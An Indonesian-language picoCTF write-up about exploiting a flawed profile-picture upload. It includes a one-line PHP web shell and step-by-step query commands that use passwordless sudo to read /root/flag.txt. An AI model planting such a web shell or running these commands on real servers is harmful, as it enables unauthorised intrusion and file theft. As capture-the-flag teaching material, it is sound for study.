# 🐚 picoCTF - File Upload RCE Exploit

## 📝 Deskripsi Soal

> A developer has added profile picture upload functionality to a website.  
> However, the implementation is flawed, and it presents an opportunity for you.  
> Your mission is to locate the file upload area and retrieve the hidden flag in `/root`.

![Upload](upload.png)
---

## 💥 RCE - Remote Code Execution

RCE (Remote Code Execution) adalah celah keamanan yang memungkinkan penyerang menjalankan perintah (command) arbitrer di server dari jarak jauh.

Dalam konteks ini, kita akan mengeksploitasi fitur upload foto profil untuk mengunggah file PHP berisi payload command execution.

---

## ⚙️ Syarat Terjadinya Eksploitasi

Agar serangan ini berhasil, 3 kondisi berikut harus terpenuhi:

1. Terdapat fitur upload file (foto).
2. File yang di-upload disimpan di lokasi yang dapat kita akses (misalnya: /uploads/).
3. File tersebut dapat dieksekusi sebagai script server (misalnya file .php di server PHP).

---

## 🧪 Langkah Eksploitasi

1. Siapkan file PHP berikut dan beri nama sembarang, misalnya: shell.php

    ```php
    <?txt system($_GET['cmd']); ?> (harus php)
    ```

2. Upload file ini melalui form upload yang tersedia di web.

3. Akses file tersebut di URL yang sesuai pathnya di ganti dengan yang udah diketahui. Contoh:

    ```
    http://<target>/uploads/shell.php?cmd=whoami
    ```

4. Uji apakah command berhasil dijalankan. Output:

    ```
    www-data
    ```

5. Cek file yang ada di direktori saat ini:

    ```
    ?cmd=ls
    ```

    Output:

    ```
    shell.php
    ```

6. Coba lihat hak akses user www-data:

    ```
    ?cmd=sudo -l
    ```

    Output:

    ```
    Matching Defaults entries for www-data on challenge:
        env_reset, mail_badpass, secure_path=...

    User www-data may run the following commands on challenge:
        (ALL) NOPASSWD: ALL
    ```

    Artinya user www-data dapat menjalankan sudo command tanpa password.

7. Lanjutkan eksplorasi ke direktori root:

    ```
    ?cmd=sudo ls /root
    ```

    Output:

    ```
    flag.txt
    ```

8. Baca isi flag:

    ```
    ?cmd=sudo cat /root/flag.txt
    ```

    Output (misal):

    ```
    picoCTF{example_flag_here}
    ```

---

## 🔐 Kenapa Menggunakan PHP?

File PHP memungkinkan kita menjalankan perintah server-side dengan fungsi seperti system(), exec(), shell_exec(), dll. Karena web server (Apache/Nginx) biasanya mengizinkan eksekusi file PHP, ini menjadi pilihan paling umum untuk eksploitasi upload.

---

## ⚠️ Disclaimer

Write-up ini dibuat untuk tujuan edukasi dan pembelajaran keamanan siber.  
Jangan gunakan teknik ini pada sistem yang bukan milik Anda tanpa izin.  
Jika ada kekeliruan dalam penjelasan, mohon dimaklumi.
